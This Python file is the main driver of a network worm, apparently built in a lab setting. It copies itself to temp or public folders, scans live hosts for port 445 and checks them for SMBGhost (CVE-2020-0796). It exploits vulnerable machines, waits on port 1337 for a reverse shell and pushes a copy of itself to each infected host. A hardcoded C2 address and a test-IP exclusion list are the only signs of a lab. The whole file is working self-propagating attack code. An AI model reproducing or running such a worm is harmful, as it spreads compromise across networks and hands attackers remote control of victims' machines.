import sys, os, platform, time, socket
import armory.SMBGhost.cve20200796scanner as cve20200796scanner
from sniff import sniff
from infect import infect
import tunnel as comm
from replicate import replicate
import uuid


def main():
    #check for commands on inital infection & choose the the correct executable file
    if len(sys.argv) > 2:
        if sys.argv[1] == "--attack" and sys.argv[2] == "windows":
            file_path = "tworm.exe"
    else:
        file_path = sys.argv[0]

    #make a replicate version of the program
    if "exe" in file_path:
        clone(file_path, str(uuid.uuid4()) + ".exe")
    else:
        clone(file_path, str(uuid.uuid4())+file_path)
    
    #uncomplete a c2_server ip address for the worm to reach back
    c2_server = "192.168.56.108"
    
    #in testing enviroment, escape those ip address
    not_testing_targets = ["192.168.56.1", "192.168.56.100", "192.168.56.108"]
    
    #pre-definded ports that the program have the tools to exploits
    vulnerable_target_ports = ['445',] 
    
    #sniff class object - scans all the IPs it can reach and identify them.
    network = sniff()

    #loops through current machine's network interface ip addresses
    for local_ip in network.get_host_networks().keys():
        
        #setup TCP Socket and Listening port
        listening_port = 1337
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.bind((local_ip,listening_port))
        sock.settimeout(30)
        sock.listen(5)

        #loop through all machines that is alive on current network ip
        for target_ip in network.get_alive_hosts(local_ip):
            
            #check target machine is not in not_testing_targets and target machine is ourself
            if (not target_ip.address in not_testing_targets) and (not local_ip == target_ip.address):
                print("Scanning Host:{} for port service".format(target_ip.address))
                #gather ports informations in our vulnerable_target_ports
                target_port_details = network.get_host_port_details(target_ip,vulnerable_target_ports)
                #print(target_port_details)
                if target_ip.address in target_port_details.keys():
                    for running_port in target_port_details[target_ip.address]["ports"]:
                        port = running_port["portid"]
                        print("Host: {} - running port:{}".format(target_ip.address, port))
                        
                        #confirm if the running port is vulnerable to our attack
                        attack = (cve20200796scanner.is_vulnerable(target_ip.address) and port == "445")
                        if attack:
                            try:
                                print("start to attack")
                                #local_ip = "0.0.0.0"
                                print("attacking port{}".format(running_port))

                                #get a copy of the worm itself
                                worm = replicate(file_path)

                                #setup communication tunnel waiting for the reverse shell connection
                                tunnel = comm.tunnel(worm,sock,local_ip, listening_port)
                                tunnel.start()
                                
                                time.sleep(2)

                                #start the infection process, exploit the target machine 
                                infection = infect(target_ip.address,int(port), local_ip, listening_port)
                                infection.start()
                                
                                # wait for the injection thread process complete
                                infection.join(timeout=30)
                                time.sleep(2)
                                # wait for the tunnel thread process complete
                                tunnel.join()
                            except Exception as e:
                                print("Error occurs on target {}: {}".format(target_ip.address,e))
                                print("continue on next target if exists.")
        # close the tcp socket   
        sock.close()    
                            
#make a clone of the file, file_path=src file, filename=dest file
def clone(file_path, filename):
    try:
        ostype = platform.system()
        if ostype == "windows":
            default_path="C:/Users/Public/Documents"
        else:
            default_path="/tmp"
        fullpath =os.path.join(default_path, filename)
        self_clone = replicate(file_path, fullpath)
        self_clone.self_replicate(ostype,file_path, fullpath)
    except Exception as e:
        print("Clone Error: {}".format(e))
        

if __name__=='__main__':
    main()